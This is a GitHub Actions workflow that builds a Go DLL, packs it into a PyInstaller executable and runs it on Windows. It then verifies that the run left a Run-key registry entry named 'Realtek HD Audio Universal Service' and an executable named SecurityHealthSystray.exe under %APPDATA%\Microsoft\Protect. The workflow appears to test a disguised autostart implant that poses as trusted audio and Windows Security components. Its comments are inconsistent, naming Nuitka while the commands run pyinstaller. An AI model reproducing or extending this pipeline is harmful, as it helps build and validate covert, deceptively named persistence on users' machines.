name: Test Go Shared Library with Python

on:
  push:
    branches:
      - main
  pull_request:

jobs:
  build-and-test:
    runs-on: windows-latest

    steps:
      # Step 1: Checkout code
      - name: Checkout code
        uses: actions/checkout@v3

      # Step 2: Set up Go
      - name: Set up Go
        uses: actions/setup-go@v4
        with:
          go-version: 1.21

      # Step 3: Set up Python
      - name: Set up Python
        uses: actions/setup-python@v4
        with:
          python-version: 3.11

      # Step 4: Install Nuitka
      - name: Install Nuitka
        run: python -m pip install --upgrade pip setuptools wheel pyinstaller

      # Step 6: Download Go dependencies
      - name: Download Go dependencies
        run: go mod tidy

      # Step 7: Build Go shared library
      - name: Build Go shared library
        run: go build -o startup.dll -buildmode=c-shared

      # Step 8: Compile Python script with Nuitka
      - name: Compile Python script with Nuitka
        run: |
          pyinstaller --onefile --add-data "./startup.dll" test_startup.py

      - name: Test compiled executable
        run: |
          dir
        shell: cmd


      # Step 9: Run the compiled executable
      - name: Test compiled executable
        run: |
          .\test_startup.exe
        shell: cmd

      # Step 10: Verify Registry and File
      - name: Verify Registry and File
        run: |
          # Check registry entry
          reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "Realtek HD Audio Universal Service"
          # Check if file exists
          if not exist "%APPDATA%\Microsoft\Protect\SecurityHealthSystray.exe" exit 1

      # Upload artifact
      - name: Upload build artifact
        uses: actions/upload-artifact@v3
        with:
          name: build-artifact
          path: build/output.txt  # Path to the file or directory to upload



